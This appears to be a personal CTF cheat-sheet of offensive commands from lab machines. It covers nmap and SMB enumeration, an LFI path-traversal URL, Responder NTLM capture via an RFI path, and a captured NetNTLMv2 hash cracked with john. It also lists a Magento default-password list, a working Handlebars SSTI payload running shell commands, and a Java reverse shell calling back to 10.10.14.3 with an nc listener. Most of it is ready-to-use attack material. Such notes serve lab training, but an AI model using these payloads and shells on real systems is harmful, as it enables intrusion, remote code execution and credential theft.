# CTF-Excalibur
CTF-Memo

-v : Increase the verbosity level (basically output more info)
-p- : This flag scans for all TCP ports ranging from 0-65535
-sV : Attempts to determine the version of the service running on a port
-sC : Scan with default NSE scripts
--min-rate : This is used to specify the minimum number of packets Nmap should send per
second; it speeds up the scan as the number goes higher

-sC: Performs a script scan using the default set of scripts. It is equivalent to --
script=default. Some of the scripts in this category are considered intrusive and
should not be run against a target network without permission.
-sV: Enables version detection, which will detect what versions are running on what
port.

```
nmap -v -p- --min-rate 5000 -sV -sC 1.1.1.1
nmap -sV -sC 1.1.1.1

nmap -p80,5040,5985,7680 1.1.1.1
nmap -p- -sV -sC 1.1.1.1

nmap firewall

nmap -sC -Pn IP
nmap -Pn IP

curl -v http://1.1.1.1
return 302 not found
```

------------

smbclient  port 445

see shares

smbclient -L IP   
smbclient -L IP -U Administrator

smbclient \\\\IP\\C$ -U Administrator


smbclient -h IP

PSexec.py

-------------

gobuster

gobuster dir --url http://ignition.htp/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

------------
LFI or Local File Inclusion
RFI or Remote File Inclusion

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

examples
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

Include PHP : 
https://www.php.net/manual/en/function.include.php


Windows New Technology LAN Manager
 
sudo responder -I tun0
http://unika.htb/index.php?page=//10.10.14.3/somefile

subl hash
(paste in this file the hash)
Administrator::RESPONDER:3eadab5a430190d9:6206C352D675427BB3087B9EEBFFCA2A:010100000000000080EADEF0A27FD80177FDF3F5D7B9EBA40000000002000800470032004500430001001E00570049004E002D004400520049005500500052003100590045004300430004003400570049004E002D00440052004900550050005200310059004500430043002E0047003200450043002E004C004F00430041004C000300140047003200450043002E004C004F00430041004C000500140047003200450043002E004C004F00430041004C000700080080EADEF0A27FD801060004000200000008003000300000000000000001000000002000004DAC410366AD31A487458FD8E15A3ADF9D3B623141A688B2CD44B5A8784EE3600A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0033000000000000000000

└──╼ [★]$ john --wordlist=/usr/share/wordlists/rockyou.txt hash

connect to port 5985 with login / password

evil-winrm -i 10.129.229.59 -u Administrator -p badminton

read file on system : 
cat flag.txt

------------------------

magento 

login page : /admin

admin admin123
admin root123
admin password1
admin administrator1
admin changeme1
admin password123
admin qwerty123
admin administrator123
admin changeme123


------------------------

Node.js
webserver : express

vulnerability we test for by submitting {{7*7}}
Server Side Template Injection

Templating engine : Handlebars
name of the BurpSuite tab used to encode text : Decoder

--------------------

Burpsuite (intercepting HTTP traffic) (linked with plugin foxyproxy)

Proxy -> HTTP history
POST -> send to repeater

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs

{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}




---------------------


 
 Reverse shell
 
 netcat
 nc -lvnp 8000
 
 String host="10.10.14.3";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 
 
 ---------------------
 
 FIRMWARE :

bin analysis

binwalk file.bin
binwalk -t file.bin
 
fdisk -l file.bin
 

 
 ENTROPY
 binwalk -E file.bin
 Is it encrypted?
 High entropy = probably encrypted (or compressed). Low entropy = probably not
 
 Extractor
 binwalk -e file.bin
 

 
 
 -------------------------
 
 
 telnet 1.1.1.1 1521
 
 
 --------------------------
 
 Search Tools 
 grep -r "login" /etc/
 
 Device_Admin   in telnetd.sh
 password in etc/config/sign


----------------
HARDWARE TOOLS

- https://www.pcbgogo.com/GerberViewer.html
- https://maxpromer.github.io/LCD-Character-Creator/
